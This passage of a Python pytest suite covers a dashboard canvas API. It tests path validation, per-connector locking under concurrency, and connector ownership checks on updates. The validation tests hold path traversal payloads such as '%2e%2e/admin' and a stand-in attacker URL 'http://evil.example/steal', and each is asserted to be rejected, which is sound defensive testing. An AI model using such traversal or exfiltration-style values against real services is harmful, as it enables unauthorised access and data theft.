        with pytest.raises(ValidationError) as exc_info:
            ApiBinding(
                kind="api",
                connector_id="some-id",
                path="%2e%2e/admin",
            )
        assert "unsafe" in str(exc_info.value).lower() or "path" in str(exc_info.value).lower()

    def test_api_binding_rejects_dot_percent2e_at_save(self):
        """.%2e/admin is rejected by the ApiBinding field_validator at parse time."""
        from pydantic import ValidationError  # noqa: PLC0415

        with pytest.raises(ValidationError) as exc_info:
            ApiBinding(
                kind="api",
                connector_id="some-id",
                path=".%2e/admin",
            )
        assert "unsafe" in str(exc_info.value).lower() or "path" in str(exc_info.value).lower()

    def test_api_binding_rejects_dotdot_literal_at_save(self):
        """Literal '../admin' is also rejected by the ApiBinding field_validator."""
        from pydantic import ValidationError  # noqa: PLC0415

        with pytest.raises(ValidationError) as exc_info:
            ApiBinding(
                kind="api",
                connector_id="some-id",
                path="../admin",
            )
        assert "unsafe" in str(exc_info.value).lower() or "path" in str(exc_info.value).lower()

    def test_api_binding_rejects_scheme_at_save(self):
        """http://evil.example/ is rejected by the ApiBinding field_validator."""
        from pydantic import ValidationError  # noqa: PLC0415

        with pytest.raises(ValidationError) as exc_info:
            ApiBinding(
                kind="api",
                connector_id="some-id",
                path="http://evil.example/steal",
            )
        assert "unsafe" in str(exc_info.value).lower() or "path" in str(exc_info.value).lower()

    def test_api_binding_accepts_normal_relative_path_at_save(self):
        """A normal relative path '/v1/data' is accepted by the ApiBinding field_validator."""
        b = ApiBinding(kind="api", connector_id="some-id", path="/v1/data")
        assert b.path == "/v1/data"

    def test_api_binding_accepts_empty_path_at_save(self):
        """An empty string path is accepted (uses base URL as-is)."""
        b = ApiBinding(kind="api", connector_id="some-id", path="")
        assert b.path == ""


# ---------------------------------------------------------------------------
# 10. [HIGH concurrency] Demo DuckDB connector thread-safety
# ---------------------------------------------------------------------------


class TestRunQueryRowsConcurrentThreadSafety:
    """run_query_rows must not crash or corrupt results when called concurrently.

    The demo DuckDB connector is a process-wide singleton whose connection is
    NOT thread-safe.  asyncio.to_thread previously passed connector.execute
    directly, allowing multiple threads to race on the same connection.

    The fix in collect.py mirrors board_data.py: a module-level WeakKeyDictionary
    of threading.Locks + _execute_with_lock serialises concurrent threads per
    connector instance while keeping the event-loop offload of asyncio.to_thread.
    """

    @pytest.mark.asyncio
    async def test_concurrent_run_query_rows_do_not_crash(self):
        """Multiple concurrent run_query_rows calls over the SAME connector do not crash.

        Regression test for HIGH concurrency finding: concurrent asyncio.to_thread
        calls on a shared connector must be serialised via the per-connector lock.

        We simulate the shared-singleton scenario by patching _resolve_connector
        to always return the same connector object, then fire N concurrent
        run_query_rows calls and assert all N return correct independent results.
        """
        import asyncio  # noqa: PLC0415
        import threading
        import types as _types
        import pyarrow as pa

        from app.dashboards.collect import run_query_rows  # noqa: PLC0415
        from app.queries.registry import get_query_registry  # noqa: PLC0415

        # Register a temporary query.
        reg = get_query_registry()
        fake_query_id = f"_test_concurrent_{uuid.uuid4().hex}"
        fake_query = _types.SimpleNamespace(
            id=fake_query_id,
            sql="SELECT 1",
            params=[],
            datastore_id=None,
        )

        def _patched_get(qid):
            if qid == fake_query_id:
                return fake_query
            return reg._store.get(qid)

        # Shared (singleton-like) connector — tracks concurrent call count.
        concurrent_high_watermark: list[int] = [0]
        active_count: list[int] = [0]
        active_count_lock = threading.Lock()

        N = 8  # number of concurrent callers

        class _SharedConnector:
            """Mimics a non-thread-safe singleton; asserts it is never entered twice."""

            def execute(self, plan):
                with active_count_lock:
                    active_count[0] += 1
                    concurrent_high_watermark[0] = max(
                        concurrent_high_watermark[0], active_count[0]
                    )
                # Simulate some work so concurrent calls would overlap without the lock.
                import time
                time.sleep(0.005)
                with active_count_lock:
                    active_count[0] -= 1
                return pa.table({"n": [1, 2, 3]})

            def close(self):
                pass

        shared_connector = _SharedConnector()
        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())

        with (
            patch.object(reg, "get", side_effect=_patched_get),
            patch(
                "app.dashboards.collect._resolve_connector",
                new=AsyncMock(return_value=(shared_connector, False)),
            ),
        ):
            results = await asyncio.gather(
                *[
                    run_query_rows(
                        query_id=fake_query_id,
                        org_id=org_id,
                        repo=repo,
                        policies={},
                    )
                    for _ in range(N)
                ]
            )

        # All N calls must have succeeded and returned correct data.
        assert len(results) == N, f"Expected {N} results, got {len(results)}"
        for i, (cols, rows) in enumerate(results):
            assert cols == ["n"], f"Call {i}: unexpected columns {cols}"
            assert rows == [[1], [2], [3]], f"Call {i}: unexpected rows {rows}"

        # The per-connector lock must have serialised execution: at most 1 thread
        # should have been inside execute() at any given time.
        assert concurrent_high_watermark[0] == 1, (
            f"Expected at most 1 concurrent execute() call (lock serialisation); "
            f"got high-watermark={concurrent_high_watermark[0]}. "
            "The per-connector lock in collect.py is not working."
        )

    @pytest.mark.asyncio
    async def test_concurrent_collect_canvas_data_do_not_crash(self):
        """Multiple concurrent collect_canvas_data calls over shared query connector do not crash.

        This exercises the full collect_canvas_data path to verify the
        _execute_with_lock fix is applied end-to-end (not just in run_query_rows).
        """
        import asyncio  # noqa: PLC0415
        import types as _types
        import pyarrow as pa

        from app.dashboards.collect import collect_canvas_data  # noqa: PLC0415
        from app.queries.registry import get_query_registry  # noqa: PLC0415

        reg = get_query_registry()
        fake_query_id = f"_test_concurrent_canvas_{uuid.uuid4().hex}"
        fake_query = _types.SimpleNamespace(
            id=fake_query_id,
            sql="SELECT 1",
            params=[],
            datastore_id=None,
        )

        def _patched_get(qid):
            if qid == fake_query_id:
                return fake_query
            return reg._store.get(qid)

        repo = InMemoryRepo()
        org_id = str(uuid.uuid4())
        user_id = str(uuid.uuid4())
        repo.seed_org_member(org_id=org_id, user_id=user_id)

        N = 6  # number of concurrent canvases

        # Create N canvases, each with one query binding to the shared fake query.
        canvas_ids = []
        for i in range(N):
            canvas = await repo.create(
                "canvases",
                org_id=org_id,
                created_by=user_id,
                name=f"Concurrent Canvas {i}",
                config={
                    "doc": {
                        "version": 1,
                        "html": f'<nubi-kpi data-el-id="el_{i}"></nubi-kpi>',
                        "bindings": {
                            f"el_{i}": {"kind": "query", "query_id": fake_query_id},
                        },
                    }
                },
            )
            canvas_ids.append(canvas["id"])

        class _SharedConnector:
            def execute(self, plan):
                import time
                time.sleep(0.003)
                return pa.table({"value": [42]})

            def close(self):
                pass

        shared_connector = _SharedConnector()

        with (
            patch.object(reg, "get", side_effect=_patched_get),
            patch(
                "app.dashboards.collect._resolve_connector",
                new=AsyncMock(return_value=(shared_connector, False)),
            ),
        ):
            all_results = await asyncio.gather(
                *[
                    collect_canvas_data(
                        canvas_id=cid,
                        org_id=org_id,
                        claims={},
                        repo=repo,
                    )
                    for cid in canvas_ids
                ]
            )

        # All N collections must have returned correct, independent results.
        assert len(all_results) == N
        for i, result in enumerate(all_results):
            el_id = f"el_{i}"
            assert el_id in result, f"Canvas {i}: missing el_id {el_id!r} in {list(result)}"
            entry = result[el_id]
            assert "error" not in entry, f"Canvas {i}: unexpected error {entry.get('error')}"
            assert entry.get("columns") == ["value"], f"Canvas {i}: columns={entry.get('columns')}"
            assert entry.get("rows") == [[42]], f"Canvas {i}: rows={entry.get('rows')}"


# ---------------------------------------------------------------------------
# 11. [LOW] PUT /canvases API-connector ownership check (Rule 6)
# ---------------------------------------------------------------------------


class TestPutCanvasApiConnectorOwnership:
    """PUT /canvases/{id} must enforce Rule 6: api bindings only to owned connectors.

    Regression for LOW finding: the PUT path previously called the sync
    validate_canvas_doc() which skips the async repo-backed ownership check,
    allowing a canvas update to bind an 'api' element to a connector_id the
    org does NOT own.  The fix replaces the sync call with
    validate_canvas_doc_with_repo() so the same ownership gate that
    POST/validate enforce is also applied on PUT.
    """

    @pytest.mark.asyncio
    async def test_put_with_non_owned_connector_is_rejected(self, canvas_client):
        """PUT /canvases/{id} with api binding to a non-owned connector_id → 400.

        The connector_id used in the binding does NOT exist in the org's datastore,
        so the ownership check must reject it with invalid_canvas_doc.
        """
        client, user_id, org_id, repo = canvas_client

        # Create a canvas to update.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "API Canvas"},
            headers=_auth_headers(user_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        # Use a connector_id that is NOT in this org's datastores.
        non_owned_connector_id = str(uuid.uuid4())

        bad_doc = {
            "version": 1,
            "title": "Bad API binding",
            "html": '<nubi-value data-el-id="el_api"></nubi-value>',
            "bindings": {
                "el_api": {
                    "kind": "api",
                    "connector_id": non_owned_connector_id,
                    "path": "/v1/data",
                },
            },
        }

        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"config": {"doc": bad_doc}},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 400, (
            f"Expected 400 for non-owned connector_id, got {resp.status_code}: {resp.text}"
        )
        body = resp.json()
        error_code = body.get("code") or (body.get("error") or {}).get("code")
        assert error_code == "invalid_canvas_doc", (
            f"Expected invalid_canvas_doc error code, got: {body}"
        )

    @pytest.mark.asyncio
    async def test_put_with_owned_http_json_connector_succeeds(self, canvas_client):
        """PUT /canvases/{id} with api binding to an owned HTTP_JSON connector → 200.

        Seeds a datastore owned by the org, then PUTs a canvas doc that binds
        to it via connector_id — the ownership check must pass and return 200.
        """
        client, user_id, org_id, repo = canvas_client

        # Seed an HTTP_JSON datastore owned by this org.
        owned_connector_id = str(uuid.uuid4())
        await repo.create(
            "datastores",
            org_id=org_id,
            created_by=user_id,
            name="Owned HTTP connector",
            id=owned_connector_id,
            config={"type": "http_json", "url": "http://api.example.com"},
        )

        # Create a canvas to update.
        create_resp = await client.post(
            "/api/v1/canvases",
            json={"name": "API Canvas"},
            headers=_auth_headers(user_id),
        )
        assert create_resp.status_code == 201, create_resp.text
        canvas_id = create_resp.json()["id"]

        good_doc = {
            "version": 1,
            "title": "Owned API binding",
            "html": '<nubi-value data-el-id="el_api"></nubi-value>',
            "bindings": {
                "el_api": {
                    "kind": "api",
                    "connector_id": owned_connector_id,
                    "path": "/v1/data",
                },
            },
        }

        resp = await client.put(
            f"/api/v1/canvases/{canvas_id}",
            json={"config": {"doc": good_doc}},
            headers=_auth_headers(user_id),
        )
        assert resp.status_code == 200, (
            f"Expected 200 for owned connector_id, got {resp.status_code}: {resp.text}"
        )
